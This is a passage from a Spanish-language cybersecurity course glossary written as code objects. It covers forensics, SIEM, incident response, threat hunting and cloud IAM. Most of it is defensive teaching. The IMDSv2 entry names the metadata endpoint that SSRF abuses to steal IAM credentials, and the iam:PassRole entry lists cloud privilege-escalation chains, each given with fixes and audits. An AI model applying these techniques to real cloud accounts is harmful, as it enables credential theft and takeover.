      "El **análisis de timeline** fusiona marcas de tiempo de múltiples fuentes (sistema de archivos, logs, registro) en una **línea cronológica** unificada para responder *qué pasó y en qué orden*. Herramientas: **plaso/log2timeline** (super timeline), **mactime**.\n" +
      "> ⚠️ Ojo con el **timestomping**: el malware altera marcas de tiempo para despistar.",
    examples: [
      "Una super timeline que ubica el momento exacto del compromiso.",
      "Correlacionar la creación de un archivo con un login sospechoso.",
    ],
    related: ["Imagen y análisis de disco", "Forense de memoria (Volatility)", "Recuperación de datos"],
  },
  {
    id: 433,
    module: 40,
    term: "Recuperación de datos",
    short: "Rescatar archivos borrados o fragmentos mediante carving y espacio no asignado.",
    detail:
      "Borrar un archivo no lo elimina: el espacio queda **no asignado** hasta sobrescribirse. Técnicas de recuperación:\n" +
      "• **File carving** — reconstruir archivos por sus **firmas** (magic bytes), sin depender del sistema de archivos (foremost, scalpel).\n" +
      "• **Slack space** — datos residuales al final del último bloque de un archivo.\n" +
      "> 💡 Por eso el borrado seguro requiere **sobrescribir**, no solo 'eliminar'.",
    examples: [
      "foremost recuperando imágenes JPG borradas por su firma.",
      "Hallar restos de un documento en el slack space.",
    ],
    related: ["Imagen y análisis de disco", "Análisis de timeline", "Adquisición de imagen"],
  },

  // ── M41 · Forense de Red ─────────────────────────────────────────────────
  {
    id: 440,
    module: 41,
    term: "Análisis de PCAP",
    short: "Examinar capturas de tráfico para reconstruir qué se comunicó por la red.",
    detail:
      "Un **PCAP** guarda el tráfico capturado. Su análisis (con **Wireshark/tshark**) reconstruye conversaciones, extrae archivos transferidos, credenciales en claro y patrones sospechosos. Es la evidencia central de la forense de red.\n" +
      "tshark -r captura.pcap -Y \"http.request\"\n" +
      "> 💡 'Follow TCP Stream' en Wireshark reconstruye una sesión completa para leerla.",
    examples: [
      "Extraer un archivo exfiltrado desde un PCAP.",
      "Ver credenciales FTP en claro dentro de la captura.",
    ],
    related: ["NetworkMiner", "Zeek (Bro)", "Detección de C2 y exfiltración"],
  },
  {
    id: 441,
    module: 41,
    term: "NetworkMiner",
    short: "Herramienta que extrae automáticamente artefactos de un PCAP sin leer paquete a paquete.",
    detail:
      "**NetworkMiner** es una herramienta de **forense de red pasiva**: a partir de un PCAP (o captura en vivo) reconstruye **hosts, sesiones, archivos transferidos, imágenes y credenciales** de forma automática, presentándolos por entidad en vez de por paquete. Acelera muchísimo el triage.",
    examples: [
      "Recuperar todos los archivos transferidos de una captura.",
      "Listar los hosts y sistemas operativos vistos en el tráfico.",
    ],
    related: ["Análisis de PCAP", "Zeek (Bro)", "Detección de C2 y exfiltración"],
  },
  {
    id: 442,
    module: 41,
    term: "Zeek (Bro)",
    short: "Motor que convierte el tráfico de red en logs estructurados ricos para análisis.",
    detail:
      "**Zeek** (antes **Bro**) no es un IDS de firmas: observa el tráfico y genera **logs estructurados** por protocolo (conn.log, dns.log, http.log, ssl.log). Es ideal para **hunting** y forense a escala, porque resume millones de paquetes en eventos consultables.",
    examples: [
      "Revisar dns.log de Zeek para hallar dominios de C2.",
      "Usar conn.log para detectar beaconing periódico.",
    ],
    related: ["Análisis de PCAP", "NetworkMiner", "Detección de C2 y exfiltración"],
  },
  {
    id: 443,
    module: 41,
    term: "Detección de C2 y exfiltración",
    short: "Reconocer en el tráfico la comunicación con el atacante y la fuga de datos.",
    detail:
      "La forense de red busca dos patrones clave:\n" +
      "• **C2 (beaconing)** — conexiones **periódicas y regulares** a un mismo destino, a veces sobre DNS o HTTPS para camuflarse.\n" +
      "• **Exfiltración** — transferencias **grandes o sostenidas** hacia el exterior, **DNS tunneling** o subidas a servicios cloud.\n" +
      "> 💡 El beaconing se delata por su **regularidad temporal**, aunque el contenido vaya cifrado.",
    examples: [
      "Detectar un beacon HTTPS cada 60 s a un dominio raro.",
      "Identificar DNS tunneling por consultas TXT anormalmente largas.",
    ],
    related: ["Zeek (Bro)", "Análisis de PCAP", "Callbacks de red (C2)"],
  },

  // ── M42 · SIEM y Monitoreo ───────────────────────────────────────────────
  {
    id: 450,
    module: 42,
    term: "SIEM",
    short: "Centraliza y correlaciona logs de toda la organización para detectar amenazas.",
    detail:
      "Un **SIEM** (*Security Information and Event Management*) **ingiere, normaliza y correlaciona** logs de endpoints, red, apps y cloud en un único lugar. Permite **detectar**, **alertar** e **investigar** desde una consola. Es el corazón de un **SOC**.\n" +
      "> 💡 Un SIEM sin buenas fuentes de log ni reglas es solo un almacén caro: el valor está en la correlación y el tuning.",
    examples: [
      "Correlacionar un login fallido masivo con un acceso exitoso posterior.",
      "Centralizar logs de firewall, AD y endpoints en una sola búsqueda.",
    ],
    related: ["Splunk y ELK", "Reglas de correlación", "SOAR"],
  },
  {
    id: 451,
    module: 42,
    term: "Splunk y ELK",
    short: "Las dos plataformas SIEM dominantes; se consultan con lenguajes propios (SPL/KQL).",
    detail:
      "• **Splunk** — SIEM comercial líder; se consulta con **SPL** (*Search Processing Language*).\n" +
      "• **ELK / Elastic Stack** — open source (Elasticsearch + Logstash + Kibana); consultas **KQL**/Lucene.\n" +
      "index=auth \"failed password\" | stats count by src_ip\n" +
      "> 💡 Ambos siguen el patrón: ingestar → indexar → buscar → visualizar.",
    examples: [
      "Una búsqueda SPL que agrupa logins fallidos por IP de origen.",
      "Un dashboard de Kibana con la actividad de autenticación.",
    ],
    related: ["SIEM", "Reglas de correlación", "Dashboards y alertas"],
  },
  {
    id: 452,
    module: 42,
    term: "Reglas de correlación",
    short: "Lógica que une varios eventos para detectar un patrón de ataque.",
    detail:
      "Una **regla de correlación** dispara una alerta cuando se cumple un **patrón** que un evento aislado no revelaría: ej. *5 logins fallidos seguidos de uno exitoso desde la misma IP* = posible fuerza bruta exitosa. Mapear las reglas a **MITRE ATT&CK** mide la cobertura de detección.\n" +
      "> ⚠️ El reto es el equilibrio: pocas reglas dejan huecos; demasiadas generan **fatiga de alertas**.",
    examples: [
      "Regla de 'viaje imposible': dos logins desde países lejanos en minutos.",
      "Detectar ejecución de PowerShell codificado (técnica ATT&CK).",
    ],
    related: ["SIEM", "Dashboards y alertas", "MITRE ATT&CK"],
  },
  {
    id: 453,
    module: 42,
    term: "Dashboards y alertas",
    short: "Visualizar el estado de seguridad y notificar lo accionable en tiempo real.",
    detail:
      "Los **dashboards** resumen visualmente la postura (logins, tráfico, alertas por severidad) para el SOC; las **alertas** notifican lo que requiere acción. La meta es **priorizar**: separar la señal del ruido y enrutar lo crítico al analista correcto.\n" +
      "> 💡 Una alerta sin contexto ni dueño es ruido; cada alerta debería ser accionable.",
    examples: [
      "Un dashboard con el top de hosts ruidosos del día.",
      "Alerta automática al detectar exfiltración hacia un dominio nuevo.",
    ],
    related: ["Reglas de correlación", "SIEM", "SOAR"],
  },
  {
    id: 454,
    module: 42,
    term: "SOAR",
    short: "Automatiza y orquesta la respuesta para que el SOC reaccione más rápido.",
    detail:
      "**SOAR** (*Security Orchestration, Automation and Response*) ejecuta **playbooks automáticos** ante una alerta: enriquecer con threat intel, aislar un host, bloquear una IP, abrir un ticket. Reduce el **tiempo de respuesta** y la carga repetitiva del analista.\n" +
      "> 💡 Automatizar lo rutinario libera al analista para la investigación que requiere criterio humano.",
    examples: [
      "Un playbook que aísla automáticamente un endpoint con malware.",
      "Enriquecer cada alerta con la reputación de la IP antes de mostrarla.",
    ],
    related: ["SIEM", "Dashboards y alertas", "Ciclo de respuesta a incidentes"],
  },

  // ── M43 · Incident Response ──────────────────────────────────────────────
  {
    id: 460,
    module: 43,
    term: "Ciclo de respuesta a incidentes",
    short: "El marco NIST 800-61 estructura cómo manejar un incidente de principio a fin.",
    detail:
      "La **respuesta a incidentes (IR)** sigue un ciclo (NIST SP 800-61): **Preparación → Detección y análisis → Contención, erradicación y recuperación → Actividad post-incidente**. Es cíclico: lo aprendido realimenta la preparación.\n" +
      "> 💡 Ver el diagrama 'Ciclo de respuesta a incidentes' con la acción clave de cada fase.",
    examples: [
      "Activar el plan de IR ante una alerta de ransomware.",
      "Un equipo (CSIRT) con roles definidos antes de que ocurra el incidente.",
    ],
    related: ["Contención", "Erradicación y recuperación", "Lecciones aprendidas"],
  },
  {
    id: 461,
    module: 43,
    term: "Contención",
    short: "Frenar la propagación del incidente sin destruir la evidencia.",
    detail:
      "La **contención** limita el daño: aislar hosts, deshabilitar cuentas, bloquear IPs. Se distingue **a corto plazo** (parar la hemorragia ya) y **a largo plazo** (medidas sostenibles mientras se erradica).\n" +
      "> ⚠️ Contener sin pensar en la **evidencia** (apagar de golpe) puede destruir la RAM y la trazabilidad forense.",
    examples: [
      "Aislar de la red el equipo infectado, pero sin apagarlo.",
      "Deshabilitar la cuenta comprometida usada para el acceso.",
    ],
    related: ["Ciclo de respuesta a incidentes", "Erradicación y recuperación", "Orden de volatilidad"],
  },
  {
    id: 462,
    module: 43,
    term: "Erradicación y recuperación",
    short: "Eliminar la amenaza por completo y restaurar las operaciones de forma segura.",
    detail:
      "• **Erradicación** — eliminar la causa raíz: malware, cuentas backdoor, persistencia, vulnerabilidad explotada.\n" +
      "• **Recuperación** — restaurar sistemas desde backups limpios, validar que están sanos y **monitorizar** de cerca por si el atacante vuelve.\n" +
      "> ⚠️ Recuperar sin erradicar la causa raíz = reinfección. Hay que estar seguro de que el atacante ya no tiene acceso.",
    examples: [
      "Reconstruir un servidor desde una imagen limpia, no solo limpiar el malware.",
      "Rotar todas las credenciales que pudieron quedar comprometidas.",
    ],
    related: ["Contención", "Ciclo de respuesta a incidentes", "Lecciones aprendidas"],
  },
  {
    id: 463,
    module: 43,
    term: "Lecciones aprendidas",
    short: "El post-mortem que convierte el incidente en mejoras concretas.",
    detail:
      "Tras el incidente, una reunión **post-mortem** (sin culpar a personas) responde: ¿qué pasó?, ¿qué funcionó?, ¿qué falló?, ¿cómo evitarlo? Genera **acciones concretas** (nuevas reglas, parches, formación) que realimentan la **Preparación**.\n" +
      "> 💡 Un incidente sin lecciones aprendidas está condenado a repetirse.",
    examples: [
      "Crear una regla de detección nueva para el TTP que se usó.",
      "Documentar la línea de tiempo y las decisiones tomadas.",
    ],
    related: ["Ciclo de respuesta a incidentes", "Playbooks y tabletops", "Erradicación y recuperación"],
  },
  {
    id: 464,
    module: 43,
    term: "Playbooks y tabletops",
    short: "Procedimientos predefinidos y simulacros que preparan al equipo antes del incidente real.",
    detail:
      "• **Playbooks de IR** — guías paso a paso por tipo de incidente (ransomware, phishing, BEC) para no improvisar bajo presión.\n" +
      "• **Tabletop exercises** — simulacros de mesa donde el equipo 'juega' un escenario para validar el plan y los roles.\n" +
      "> 💡 El momento de descubrir que el plan falla es en un simulacro, no en el incidente real.",
    examples: [
      "Un playbook de ransomware con pasos de contención y contactos.",
      "Un tabletop anual simulando una brecha de datos.",
    ],
    related: ["Lecciones aprendidas", "Ciclo de respuesta a incidentes", "Contención"],
  },

  // ── M44 · Threat Hunting ─────────────────────────────────────────────────
  {
    id: 470,
    module: 44,
    term: "Threat hunting",
    short: "Buscar proactivamente atacantes que ya eludieron las defensas automáticas.",
    detail:
      "El **threat hunting** asume que el atacante **ya está dentro** y lo busca de forma **proactiva**, sin esperar una alerta. Combina hipótesis, datos (logs, EDR, red) y conocimiento del adversario para encontrar lo que las reglas automáticas no vieron.\n" +
      "> 💡 Detección = reactiva (espera la alerta); hunting = proactiva (va a buscar al intruso).",
    examples: [
      "Buscar señales de movimiento lateral que ninguna alerta disparó.",
      "Rastrear el uso anómalo de una herramienta legítima (LOLBins).",
    ],
    related: ["Hunting basado en hipótesis", "Mapeo a ATT&CK", "Consultas KQL/SPL"],
  },
  {
    id: 471,
    module: 44,
    term: "Hunting basado en hipótesis",
    short: "Partir de una suposición concreta sobre cómo podría estar actuando un atacante.",
    detail:
      "Un buen hunt empieza con una **hipótesis** comprobable, a menudo derivada de **threat intelligence** o de una técnica ATT&CK: *'Si un atacante usara Pass-the-Hash, vería autenticaciones NTLM anómalas entre estos hosts'*. Luego se buscan los datos que la confirmen o descarten.",
    examples: [
      "Hipótesis: 'hay persistencia vía tareas programadas creadas de noche'.",
      "Hipótesis basada en un informe de CTI sobre un grupo activo.",
    ],
    related: ["Threat hunting", "Mapeo a ATT&CK", "Threat intelligence"],
  },
  {
    id: 472,
    module: 44,
    term: "Mapeo a ATT&CK",
    short: "Usar la matriz MITRE ATT&CK para guiar la caza y medir la cobertura.",
    detail:
      "**MITRE ATT&CK** da un catálogo de **TTPs** reales que sirve de **mapa** para el hunting: elegir técnicas a cazar, priorizar por las que usan los adversarios relevantes y **medir la cobertura** de detección (¿qué técnicas vería mi SOC?). El **ATT&CK Navigator** visualiza esa cobertura.",
    examples: [
      "Cazar T1053 (Scheduled Task) como técnica de persistencia.",
      "Pintar en ATT&CK Navigator qué técnicas cubren mis detecciones.",
    ],
    related: ["Hunting basado en hipótesis", "MITRE ATT&CK", "Hunting playbooks"],
  },
  {
    id: 473,
    module: 44,
    term: "Consultas KQL/SPL",
    short: "Los lenguajes para interrogar los datos durante una caza.",
    detail:
      "El hunting se materializa en **consultas** sobre los datos: **KQL** (Microsoft Sentinel/Defender) y **SPL** (Splunk) son los más usados. Permiten filtrar, agregar y correlacionar grandes volúmenes para confirmar o descartar la hipótesis.\n" +
      "DeviceProcessEvents | where FileName == \"powershell.exe\" and ProcessCommandLine contains \"-enc\"\n" +
      "> 💡 Una consulta de hunting que resulta útil se convierte en una regla de detección permanente.",
    examples: [
      "KQL que busca PowerShell con comandos codificados.",
      "SPL que detecta procesos hijos anómalos de Office.",
    ],
    related: ["Threat hunting", "Hunting playbooks", "Splunk y ELK"],
  },
  {
    id: 474,
    module: 44,
    term: "Hunting playbooks",
    short: "Cazas repetibles y documentadas que se ejecutan de forma recurrente.",
    detail:
      "Un **hunting playbook** documenta un hunt para poder **repetirlo y automatizarlo**: la hipótesis, las fuentes de datos, las consultas y qué hacer con los hallazgos. Los hunts exitosos se **convierten en detección automática**, cerrando el ciclo entre caza proactiva y monitoreo.",
    examples: [
      "Un playbook mensual de caza de persistencia en Windows.",
      "Convertir un hunt fructífero en una regla del SIEM.",
    ],
    related: ["Consultas KQL/SPL", "Mapeo a ATT&CK", "Reglas de correlación"],
  },

  // ── M45 · Cloud Security: AWS ────────────────────────────────────────────
  {
    id: 480,
    module: 45,
    term: "Modelo de responsabilidad compartida",
    short: "El proveedor protege la nube; tú proteges lo que pones en ella.",
    detail:
      "En la nube la seguridad se **reparte**: el proveedor (AWS) asegura la **infraestructura** ('seguridad **de** la nube'); el cliente asegura **sus datos, identidades y configuración** ('seguridad **en** la nube').\n" +
      "| Responsable | Ejemplos |\n" +
      "|---|---|\n" +
      "| Proveedor | Hardware, hipervisor, red física |\n" +
      "| Cliente | IAM, cifrado, config de S3, parches de la VM |\n" +
      "> ⚠️ La mayoría de las brechas cloud son por **configuración del cliente**, no por fallo del proveedor.",
    examples: [
      "AWS protege el datacenter; tú evitas dejar un bucket público.",
      "El cliente gestiona los permisos IAM y el cifrado de sus datos.",
    ],
    related: ["IAM y políticas", "S3 security", "CloudTrail y GuardDuty"],
  },
  {
    id: 481,
    module: 45,
    term: "IAM y políticas",
    short: "El control de acceso de AWS: quién puede hacer qué sobre qué recurso.",
    detail:
      "**IAM** gestiona identidades (usuarios, **roles**) y **políticas** JSON que conceden permisos. La buena práctica es **mínimo privilegio** y usar **roles** temporales en vez de claves de larga duración.\n" +
      "{ \"Effect\": \"Allow\", \"Action\": \"s3:GetObject\", \"Resource\": \"arn:aws:s3:::bucket/*\" }\n" +
      "> ⚠️ Políticas con `\"Action\": \"*\"` o `\"Resource\": \"*\"` son un riesgo clásico de sobre-permiso.",
    examples: [
      "Un rol IAM para que una EC2 lea un bucket, sin claves embebidas.",
      "Revisar políticas con Access Analyzer para detectar accesos amplios.",
    ],
    related: ["Modelo de responsabilidad compartida", "Principio de mínimo privilegio", "S3 security"],
  },
  {
    id: 482,
    module: 45,
    term: "S3 security",
    short: "Los buckets de almacenamiento: privados por defecto, pero fáciles de exponer.",
    detail:
      "**S3** guarda objetos en *buckets*. Son privados por defecto, pero una mala política o ACL puede dejarlos **públicos** — origen de incontables filtraciones. Controles clave: **Block Public Access**, **cifrado** (SSE), políticas de bucket restrictivas y versionado.\n" +
      "> ⚠️ 'Bucket público' es uno de los hallazgos más comunes y graves en auditorías cloud.",
    examples: [
      "Activar 'Block Public Access' a nivel de cuenta.",
      "Cifrado por defecto (SSE-KMS) en todos los buckets.",
    ],
    related: ["IAM y políticas", "Modelo de responsabilidad compartida", "VPC y security groups"],
  },
  {
    id: 483,
    module: 45,
    term: "VPC y security groups",
    short: "La red privada virtual y sus firewalls a nivel de instancia.",
    detail:
      "Una **VPC** es tu red aislada en AWS. Dentro, los **security groups** son firewalls **stateful** a nivel de instancia (reglas de entrada/salida) y los **NACLs** filtran a nivel de subred. Segmentar (subredes públicas/privadas) limita el alcance de un compromiso.\n" +
      "> ⚠️ Un security group con `0.0.0.0/0` en el puerto 22 (SSH) expone la instancia a todo Internet.",
    examples: [
      "Base de datos en subred privada, sin IP pública.",
      "Restringir SSH al rango de IPs de la oficina, no a 0.0.0.0/0.",
    ],
    related: ["S3 security", "DMZ y segmentación de red", "CloudTrail y GuardDuty"],
  },
  {
    id: 484,
    module: 45,
    term: "CloudTrail y GuardDuty",
    short: "La auditoría (qué se hizo) y la detección de amenazas gestionada de AWS.",
    detail:
      "• **CloudTrail** — registra **todas las llamadas a la API** de la cuenta: quién hizo qué y cuándo. Es la base de la auditoría y la forense en AWS.\n" +
      "• **GuardDuty** — servicio gestionado que **detecta amenazas** analizando CloudTrail, VPC Flow Logs y DNS (ej. credenciales usadas desde una IP rara, criptominería).\n" +
      "> 💡 Sin CloudTrail habilitado, una investigación post-incidente en AWS es casi ciega.",
    examples: [
      "Detectar con GuardDuty el uso de credenciales IAM desde otro país.",
      "Revisar CloudTrail para ver quién borró un recurso.",
    ],
    related: ["VPC y security groups", "IAM y políticas", "SIEM"],
  },
  {
    id: 485,
    module: 45,
    term: "IMDSv2 y SSRF a metadata",
    short: "El endpoint 169.254.169.254 filtra credenciales si la app tiene un SSRF; IMDSv2 lo blinda.",
    detail:
      "Cada EC2 puede consultar sus propias credenciales IAM en un endpoint interno **link-local**: `http://169.254.169.254/latest/meta-data/`. Si la app tiene un **SSRF**, el atacante consulta ese endpoint desde el servidor y **roba el rol IAM completo** (access key + secret + session token).\n" +
      "\n**Caso emblemático: Capital One 2019** — un WAF con SSRF sirvió las credenciales de un rol con acceso a S3 → 106M de registros filtrados, ~$270M en multas.\n" +
      "\n**IMDSv1 vs IMDSv2:**\n" +
      "| | IMDSv1 | IMDSv2 |\n" +
      "|---|---|---|\n" +
      "| Método | GET simple | PUT para token + GET con header |\n" +
      "| Vulnerable a SSRF | Sí | No (SSRF típico solo hace GET) |\n" +
      "| Hop limit | Sin límite | Configurable (`--http-put-response-hop-limit 1`) |\n" +
      "> 💡 **Hop limit = 1** impide que un contenedor Docker con NAT consulte el IMDS del host (contramedida clave post-Capital One).\n" +
      "> ⚠️ En 2023 AWS empezó a hacer IMDSv2 **el default** en nuevos AMIs, pero cuentas viejas siguen con IMDSv1 disponible. Auditar con `aws ec2 describe-instances --query 'Reservations[].Instances[].MetadataOptions'`.",
    examples: [
      "Enforcement con SCP: `ec2:MetadataHttpTokens = required` a nivel de organización.",
      "Bloqueo con security-hub check `EC2.8` que alerta si alguna instancia sigue con IMDSv1.",
      "Auditoría con AWS Config Rule `ec2-imdsv2-check`.",
    ],
    related: ["IAM y políticas", "Cross-account roles y confused deputy", "STS y credenciales temporales", "SSRF y metadata cloud"],
  },
  {
    id: 486,
    module: 45,
    term: "Cross-account roles y confused deputy",
    short: "El sts:AssumeRole entre cuentas es la vía moderna; sin ExternalId, un tercero puede engañarlo.",
    detail:
      "Un **rol cross-account** deja que un principal de otra cuenta AWS asuma un rol en la tuya. El *trust policy* declara quién puede hacer `sts:AssumeRole`:\n" +
      "\n```json\n{ \"Effect\": \"Allow\", \"Principal\": { \"AWS\": \"arn:aws:iam::CUENTA_TERCERO:root\" }, \"Action\": \"sts:AssumeRole\", \"Condition\": { \"StringEquals\": { \"sts:ExternalId\": \"UUID-SECRETO\" } } }\n```\n" +
      "\n**El confused deputy problem:** un proveedor SaaS (Datadog, Terraform Cloud) atiende a **múltiples clientes**. Si el trust policy solo verifica la cuenta del proveedor, **cualquier cliente del proveedor** puede pedirle que asuma **tu** rol.\n" +
      "\n**Fix: `sts:ExternalId`** — un UUID acordado entre tú y el proveedor; el proveedor lo incluye en el AssumeRole solo para ti. Sin ese ID exacto, la asunción falla.\n" +
      "> 💡 AWS documentó el confused deputy en 2011 y `sts:ExternalId` es la contramedida oficial de AWS Security Hub check.\n" +
      "> ⚠️ Nunca aceptes un ExternalId que el proveedor 'te sugiera' sin verificar — el UUID debe ser secreto y no compartido con otros clientes.",
    examples: [
      "Datadog integration: acepta el ExternalId único que Datadog genera para tu tenant.",
      "Rol de auditoría cross-account con `ExternalId` + `MFA` + `SourceIp` restringido.",
      "AWS Access Analyzer detectando trust policies con Principal amplio sin ExternalId.",
    ],
    related: ["IAM y políticas", "IMDSv2 y SSRF a metadata", "STS y credenciales temporales", "iam:PassRole y privilege escalation"],
  },
  {
    id: 487,
    module: 45,
    term: "iam:PassRole y privilege escalation",
    short: "El permiso para 'pasar' un rol a un servicio es un vector clásico de escalada en AWS.",
    detail:
      "Cuando lanzas una EC2, un Lambda o una tarea ECS, le **asignas un rol IAM**. La API requiere el permiso **`iam:PassRole`** sobre ese rol. Es el punto de escalada más común de AWS: si un usuario tiene `iam:PassRole` amplio + `lambda:CreateFunction`, puede crear una Lambda con el rol `AdministratorAccess` y ejecutar código como admin.\n" +
      "\n**Cadenas típicas de escalada:**\n" +
      "• `iam:PassRole` + `ec2:RunInstances` → EC2 con rol admin.\n" +
      "• `iam:PassRole` + `lambda:CreateFunction` + `lambda:InvokeFunction` → RCE con rol admin.\n" +
      "• `iam:PassRole` + `cloudformation:CreateStack` → provisiona lo que sea con un rol privilegiado.\n" +
      "• `iam:PassRole` + `codebuild:CreateProject` + `codebuild:StartBuild` → build con rol admin.\n" +
      "\n**Fix:** restringir `iam:PassRole` a **roles específicos** con `Resource: arn:aws:iam::*:role/RolExacto`, nunca `Resource: *`. Añadir la condición `iam:PassedToService` para limitar a qué servicio se puede pasar.\n" +
      "> 💡 Herramientas como **Pacu** (AWS pentest framework) y **CloudSplaining** enumeran automáticamente cadenas de PassRole.\n" +
      "> ⚠️ Un permiso `iam:PassRole` con `Resource: *` es equivalente a admin latente.",
    examples: [
      "CloudSplaining detectando un rol de developer con `iam:PassRole: *` explotable.",
      "SCP que veta `iam:PassRole` sobre roles con etiqueta `Sensitivity=high`.",
      "Access Analyzer generando la política mínima con solo los roles que realmente se pasan.",
    ],
    related: ["IAM y políticas", "Cross-account roles y confused deputy", "STS y credenciales temporales", "Principio de mínimo privilegio", "Service Control Policies (SCPs)"],
  },
  {
    id: 488,
    module: 45,
    term: "STS y credenciales temporales",
    short: "AWS STS emite credenciales de vida corta; role chaining, session tags y source identity son las herramientas del oficio.",
    detail:
      "**AWS STS** (*Security Token Service*) es el emisor de credenciales **temporales** de AWS. Todos los mecanismos modernos las usan: `AssumeRole`, `AssumeRoleWithWebIdentity` (para OIDC), `GetSessionToken` (para MFA).\n" +
      "\n**Ventaja vs IAM user con access keys estáticas:** las credenciales de STS **caducan** (15 min a 12 h) y se pueden revocar por rol/sesión, no por rotación manual.\n" +
      "\n**Conceptos clave:**\n" +
      "| Concepto | Qué es | Cuándo usarlo |\n" +
      "|---|---|---|\n" +
      "| **Role chaining** | Un rol asume otro | Restringido a 1 hop, session ≤ 1h |\n" +
      "| **Session policies** | Política inline que reduce permisos del rol para esta sesión | Least privilege dinámico |\n" +
      "| **Session tags** | Tags que viajan con la sesión para ABAC | ABAC por session |\n" +
      "| **Source identity** | Identidad del principal original, inmutable a través de la cadena | Auditoría, no repudio |\n" +
      "\n> 💡 **`sts:SourceIdentity`** es crítico: sin él, un CloudTrail muestra 'el rol X hizo Y' pero no **qué usuario humano** activó al rol. Con Source Identity forzada por el trust policy, el humano queda pegado a cada acción.\n" +
      "> ⚠️ Las session policies pueden **reducir** permisos pero nunca ampliarlos. Útil para dar al cliente un token que solo puede hacer una acción específica.",
    examples: [
      "Federación SAML → AssumeRoleWithSAML → sesión de 8h con SourceIdentity = email del empleado.",
      "GitHub Actions → OIDC → AssumeRoleWithWebIdentity → session policy que restringe al bucket del proyecto.",
      "Rol de auditor con session tag `Environment=prod` para ABAC.",
    ],
    related: ["IAM y políticas", "Cross-account roles y confused deputy", "iam:PassRole y privilege escalation", "Workload Identity Federation (WIF)"],
  },
  {
    id: 489,
    module: 45,
    term: "Service Control Policies (SCPs)",
    short: "Guardrails a nivel de AWS Organization: lo que ninguna cuenta de la OU puede hacer, sin importar sus permisos IAM.",
    detail:
      "Un **SCP** es una política que se aplica a nivel de **AWS Organization / OU / cuenta** y actúa como **techo máximo**: define lo que las identidades de esas cuentas **pueden llegar a hacer**, incluso si su IAM policy dice que sí.\n" +
      "\n**Regla mental:** `Permisos efectivos = IAM policy ∩ SCP`. Si el SCP deniega, gana el SCP.\n" +
      "\n**Guardrails típicos:**\n" +
      "```json\n// Prohibir salir de una región\n{ \"Effect\": \"Deny\", \"NotAction\": [\"iam:*\", \"organizations:*\"], \"Resource\": \"*\", \"Condition\": { \"StringNotEquals\": { \"aws:RequestedRegion\": [\"us-east-1\", \"eu-west-1\"] } } }\n\n// Vetar la creación de IAM users (forzar SSO)\n{ \"Effect\": \"Deny\", \"Action\": [\"iam:CreateUser\", \"iam:CreateAccessKey\"], \"Resource\": \"*\" }\n\n// Forzar IMDSv2 en todas las EC2 nuevas\n{ \"Effect\": \"Deny\", \"Action\": \"ec2:RunInstances\", \"Resource\": \"arn:aws:ec2:*:*:instance/*\", \"Condition\": { \"StringNotEquals\": { \"ec2:MetadataHttpTokens\": \"required\" } } }\n```\n" +
      "\n**Condición central para blast radius:** `aws:PrincipalOrgID` — solo permite acciones de identidades de tu propia organización. Cierra la puerta al confused deputy externo.\n" +
      "> 💡 SCPs **no** conceden permisos, solo los limitan. Un SCP que solo dice `Allow *` no hace nada por sí solo — necesita IAM policy.\n" +
      "> ⚠️ SCP mal escrito puede romper toda la organización. Siempre probar con `aws organizations describe-effective-policy` antes de aplicar.",
    examples: [
      "SCP de la OU `Prod`: deny a cualquier `ec2:RunInstances` que no exija IMDSv2.",
      "SCP root: deny a `s3:PutBucketPublicAccessBlock` con `Effect=Disabled`.",
      "SCP con `aws:PrincipalOrgID` para prevenir que un rol asumido desde una cuenta externa haga daño.",
    ],
    related: ["IAM y políticas", "iam:PassRole y privilege escalation", "IMDSv2 y SSRF a metadata", "Cloud hardening y CSPM"],
  },

  // ── M46 · Cloud Security: Azure y GCP ────────────────────────────────────
  {
    id: 490,
    module: 46,
    term: "Azure AD / Entra ID y RBAC",
    short: "El directorio de identidades de Azure y su control de acceso por roles.",
    detail:
      "**Microsoft Entra ID** (antes **Azure AD**) es el directorio de identidades de Azure/Microsoft 365. El acceso a recursos se gobierna con **RBAC** (roles asignados a un *scope*: suscripción, grupo de recursos, recurso) y se refuerza con **Conditional Access** y MFA.\n" +
      "> 💡 Entra ID es el equivalente cloud de Active Directory y un objetivo prioritario de los atacantes.",
    examples: [
      "Asignar el rol 'Reader' a un grupo a nivel de suscripción.",
      "Conditional Access que exige MFA fuera de la red corporativa.",
    ],
    related: ["GCP IAM", "Cloud hardening y CSPM", "Active Directory: dominio, bosque y OU"],
  },
  {
    id: 491,
    module: 46,
    term: "GCP IAM",
    short: "El control de acceso de Google Cloud: identidades, roles y service accounts.",
    detail:
      "En **GCP**, IAM concede **roles** (primitivos, predefinidos o personalizados) a identidades sobre recursos organizados jerárquicamente (organización → carpeta → proyecto → recurso). Las **service accounts** son identidades para cargas de trabajo; sus claves son un objetivo sensible.\n" +
      "> ⚠️ Las claves de service account filtradas son una vía directa de compromiso; preferir identidades sin clave (Workload Identity).",
    examples: [
      "Un rol predefinido 'roles/storage.objectViewer' sobre un proyecto.",
      "Workload Identity para evitar claves de service account.",
    ],
    related: ["Azure AD / Entra ID y RBAC", "IAM y políticas", "Cloud hardening y CSPM"],
  },
  {
    id: 492,
    module: 46,
    term: "Cloud hardening y CSPM",
    short: "Endurecer la configuración cloud y vigilarla de forma continua.",
    detail:
      "El **hardening cloud** aplica buenas prácticas (mínimo privilegio, cifrado, sin recursos públicos, logging). Como la configuración cambia rápido, se usan herramientas **CSPM** (*Cloud Security Posture Management*) que **escanean continuamente** contra benchmarks (CIS) y alertan de desviaciones (un bucket que se volvió público, un puerto abierto).",
    examples: [
      "Prowler/ScoutSuite auditando una cuenta contra el CIS Benchmark.",
      "Una alerta CSPM cuando alguien expone una base de datos.",
    ],
    related: ["Hardening y CIS Benchmarks", "Multi-cloud", "S3 security"],
  },
  {
    id: 493,
    module: 46,
    term: "Multi-cloud",
    short: "Usar varios proveedores a la vez: más resiliencia, más complejidad de seguridad.",
    detail:
      "Una estrategia **multi-cloud** (AWS + Azure + GCP) evita el *lock-in* y mejora la resiliencia, pero **multiplica la superficie**: cada nube tiene su modelo de IAM, su jerga y sus controles. El reto es la **visibilidad y políticas unificadas**, donde el CSPM y una gestión de identidad centralizada ayudan.",
    examples: [
      "Cargas en AWS y backups en GCP para resiliencia.",
      "Un CSPM único que cubre las tres nubes con una sola consola.",
    ],
    related: ["Cloud hardening y CSPM", "Azure AD / Entra ID y RBAC", "GCP IAM"],
  },
  {
    id: 494,
    module: 46,
    term: "Workload Identity Federation (WIF)",
    short: "Federar identidad OIDC de un CI o cluster externo a GCP/Azure sin claves de service account.",
    detail:
